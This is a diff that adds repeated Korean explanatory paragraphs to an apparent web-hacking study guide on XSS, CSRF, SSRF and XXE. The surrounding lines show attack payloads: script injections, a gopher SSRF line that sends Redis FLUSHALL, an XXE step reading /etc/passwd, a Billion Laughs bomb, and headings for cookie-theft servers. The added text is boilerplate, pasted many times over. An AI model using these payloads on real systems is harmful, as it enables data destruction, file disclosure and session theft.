@@ -14,6 +14,9 @@
 
 ### 1-1. Stored XSS (저장형)
 
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
+
 ```html
 <!-- 게시판 글 작성 시 삽입 -->
 <script>alert('XSS')</script>
@@ -52,6 +55,9 @@
 
 ### 1-2. Reflected XSS (반사형)
 
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
+
 ```
 취약한 URL:
 http://target.com/search?q=<script>alert(1)</script>
@@ -69,6 +75,9 @@ http://target.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
 
 ### 1-3. DOM-based XSS
 
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
+
 ```javascript
 // 취약한 코드
 var name = document.location.hash.substring(1);
@@ -85,6 +94,9 @@ document.write('<a href="' + location.href + '">link</a>');
 ---
 
 ### 1-4. XSS 필터 우회
+
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
 
 ```html
 <!-- 태그 필터 우회 -->
@@ -125,6 +137,9 @@ document.write('<a href="' + location.href + '">link</a>');
 ---
 
 ### 1-5. XSS 쿠키 탈취 서버 만들기
+
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
 
 ```python
 #!/usr/bin/env python3
@@ -383,6 +398,9 @@ if __name__ == "__main__":
 
 ### CSRF 토큰 우회
 
+
+CSRF(Cross-Site Request Forgery)는 피해자의 인증 상태를 악용하여 의도치 않은 요청을 보내는 공격입니다. 피해자가 로그인된 상태에서 공격자가 만든 페이지를 방문하면, 피해자의 권한으로 서버에 요청이 전송됩니다.
+
 ```
 1. CSRF 토큰 미검증 → 토큰 없이 요청
 2. Same-site 요청으로 토큰 획득 (XSS 연계)
@@ -512,6 +530,9 @@ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
 
 ### 3-5. DOM 기반 XSS 소스와 싱크 (Sources & Sinks)
 
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
+
 ```
 소스 (Source) — 공격자 입력이 들어오는 지점:
   document.URL
@@ -612,6 +633,8 @@ http://target.com/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL  (Redis 명령)
 
 ### 4-3. XXE (XML External Entity)
 
+XML 데이터 예시입니다. XXE(XML External Entity) 인젝션은 XML 파서의 외부 엔티티 처리 기능을 악용하는 웹 취약점입니다.
+
 ```xml
 <!-- 기본 XXE -->
 <?xml version="1.0"?>
@@ -676,6 +699,9 @@ http://target.com/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL  (Redis 명령)
 ```
 
 ### Burp로 XSS 찾기
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
+
 ```
 1. Proxy로 모든 입력 파라미터 식별
 2. Repeater에서 각 파라미터에 <xss> 삽입
@@ -684,6 +710,9 @@ http://target.com/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL  (Redis 명령)
 ```
 
 ### Burp로 SQL Injection 찾기
+
+SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.
+
 ```
 1. Repeater에서 파라미터에 ' 삽입 → SQL 오류 확인
 2. 파라미터에 ' AND '1'='1 vs ' AND '1'='2 응답 비교
@@ -709,6 +738,9 @@ safe_output = escape(user_input)
 ```
 
 ### Content Security Policy (CSP)
+
+HTTP 요청/응답 예시입니다. 웹 취약점 분석 시 실제 HTTP 패킷 구조를 이해하면 정확한 페이로드를 작성하는 데 도움이 됩니다.
+
 ```http
 # 가장 엄격한 CSP
 Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'
@@ -719,6 +751,9 @@ Content-Security-Policy: script-src 'nonce-{random_value}'
 ```
 
 ### HttpOnly, Secure 쿠키
+
+HTTP 요청/응답 예시입니다. 웹 취약점 분석 시 실제 HTTP 패킷 구조를 이해하면 정확한 페이로드를 작성하는 데 도움이 됩니다.
+
 ```http
 Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
 ```
@@ -730,6 +765,9 @@ SameSite=Strict → 외부 사이트에서 쿠키 미전송 (CSRF 방어)
 ```
 
 ### CSRF 토큰 탈취 PoC (XSS 연계)
+
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
 
 ```python
 #!/usr/bin/env python3
@@ -857,6 +895,9 @@ if __name__ == "__main__":
 
 ### CSRF 방어 구현
 
+
+CSRF(Cross-Site Request Forgery)는 피해자의 인증 상태를 악용하여 의도치 않은 요청을 보내는 공격입니다. 피해자가 로그인된 상태에서 공격자가 만든 페이지를 방문하면, 피해자의 권한으로 서버에 요청이 전송됩니다.
+
 ```python
 #!/usr/bin/env python3
 """
@@ -964,6 +1005,9 @@ MFA (2단계 인증)가 설정된 계정도 XSS로 우회 가능
 ```
 
 ### MFA 우회 XSS 시나리오
+
+XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.
+
 ```javascript
 // 시나리오 1: 세션 쿠키 탈취 (HttpOnly 없을 때)
 <script>
@@ -1075,6 +1119,9 @@ MFA (2단계 인증)가 설정된 계정도 XSS로 우회 가능
 ## 9. XXE 심화 (Billion Laughs + SAML 공격)
 
 ### Billion Laughs DoS 변형
+
+XML Billion Laughs 공격(XML 폭탄)입니다. 중첩된 엔티티 참조로 메모리를 기하급수적으로 소진시켜 DoS를 유발합니다.
+
 ```xml
 <!-- 지수적 확장 공격 -->
 <?xml version="1.0"?>
@@ -1120,6 +1167,8 @@ cat saml_modified.xml | base64 -w0
 
 # 변조된 SAMLResponse 전송 → 서버가 /etc/passwd를 SAML 처리 중 읽음
 ```
+
+XML 데이터 예시입니다. XXE(XML External Entity) 인젝션은 XML 파서의 외부 엔티티 처리 기능을 악용하는 웹 취약점입니다.
 
 ```xml
 <!-- 변조된 SAML Response -->
